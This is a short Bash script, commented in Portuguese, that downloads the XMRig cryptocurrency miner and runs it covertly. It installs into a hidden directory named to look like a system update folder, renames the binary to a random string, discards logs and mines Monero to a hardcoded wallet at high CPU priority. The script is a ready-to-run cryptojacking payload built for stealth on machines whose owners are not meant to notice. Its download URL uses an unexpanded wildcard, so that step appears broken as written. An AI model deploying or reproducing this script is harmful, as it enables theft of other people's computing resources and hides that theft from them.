#!/bin/bash

# === CONFIGURAÇÃO ===
WALLET="46sF91sVBzUVMgoV2nd5DQTSKM1LgvArTQNw5kufrVNYVV4CDrMiKno4c5kTpoqnH9eVu3dGqTuyEWH5muz32f9XESZHUrm"

POOL="xmr-eu1.nanopool.org:14433"
WORKER=$(hostname)-$(date +%s)
RAND_BIN=$(tr -dc a-z0-9 </dev/urandom | head -c 8)

echo "[+] Atualizando sistema e instalando dependências..."
apt update -y && apt install -y wget tar

echo "[+] Criando diretório oculto..."
mkdir -p ~/.sysupd/.core
cd ~/.sysupd/.core

echo "[+] Baixando e extraindo XMRig..."
wget -q https://github.com/xmrig/xmrig/releases/latest/download/xmrig-*-linux-x64.tar.gz -O core.tar.gz
tar -xf core.tar.gz
cd xmrig-*-linux-x64 || exit

echo "[+] Renomeando e executando o minerador..."
mv xmrig $RAND_BIN
chmod +x $RAND_BIN

./$RAND_BIN -o $POOL -u $WALLET -k --tls \
  --donate-level=0 --cpu-priority=5 \
  --log-file=/dev/null --user-agent="$WORKER"

